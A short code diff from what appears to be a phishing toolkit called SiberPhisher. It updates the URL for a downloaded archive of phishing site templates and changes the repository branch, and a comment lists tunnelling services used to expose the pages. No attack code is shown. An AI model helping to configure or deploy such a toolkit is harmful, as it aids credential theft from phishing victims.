@@ -225,8 +225,8 @@ columns = get_terminal_size().columns
 
 repo_url = "https://github.com/BeZaSah/SiberPhisher"
 sites_repo = "https://gitlab.com/KasRoudra/maxsites"
-websites_url = f"{sites_repo}/archive/main.zip"
-repo_branch = "siberphisher"
+websites_url = f"{sites_repo}/archive/refs/heads/main.zip"
+repo_branch = "main"
 
 # CF = Cloudflared, LX = LocalXpose, LHR = LocalHostRun, #SVO = Serveo
 
